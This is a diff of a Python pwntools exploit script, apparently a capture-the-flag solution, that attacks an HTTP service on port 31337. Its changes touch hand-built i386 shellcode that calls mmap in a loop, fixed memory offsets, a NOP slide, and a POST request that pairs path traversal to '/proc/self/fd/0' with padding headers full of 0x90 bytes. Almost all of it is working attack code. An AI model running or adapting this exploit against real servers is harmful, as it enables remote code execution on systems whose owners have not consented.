@@ -50,20 +50,17 @@ def nop_slide(s):
 guc_offset = 0x56556778 - 0x56555000
 ret200 = 0x56556dee - 0x56555000
 
-context.os = "linux"
-context.bits = 32
-context.arch = "i386"
 shellcode  = ""
 shellcode += "mov esi, 0x57000000\n"
 shellcode += "lp:\n"
 
-shellcode += shellcraft.push(0)
-shellcode += shellcraft.push(-1)
-shellcode += shellcraft.push(34)
-shellcode += shellcraft.push(3)
-shellcode += shellcraft.push(4096)
-shellcode += shellcraft.push('esi')
-shellcode += shellcraft.syscall(90, 'esp')
+shellcode += shellcraft.i386.push(0)
+shellcode += shellcraft.i386.push(-1)
+shellcode += shellcraft.i386.push(34)
+shellcode += shellcraft.i386.push(3)
+shellcode += shellcraft.i386.push(4096)
+shellcode += shellcraft.i386.push('esi')
+shellcode += shellcraft.i386.syscall(90, 'esp')
 shellcode += "add esp, 24\n"
 shellcode += "cmp eax, esi\n"
 
@@ -74,7 +71,7 @@ shellcode += "elp:\n"
 
 shellcode += "sub esi, 0x6000\n"
 
-shellcode += shellcraft.pushstr(hint)
+shellcode += shellcraft.i386.pushstr(hint)
 shellcode += "push esi\n"
 shellcode += f"add esi, {guc_offset}\n"
 shellcode += "mov ecx, esp\n"
@@ -102,7 +99,7 @@ def try_attack(n):
     payload += nop_slide(shellcode)
 
     data  = b""
-    data += f"POST /static/{due('../../../dev/stdin')} HTTP/1.1\r\n".encode()
+    data += f"POST /static/{due('../../../proc/self/fd/0')} HTTP/1.1\r\n".encode()
     data += f"Host: {ip}:31337\r\n".encode()
     data += (b"Kekmeister: " + b"\x90" * 200 + b"\r\n") * 100
     data += f"Content-Length: {len(payload)}\r\n\r\n".encode()
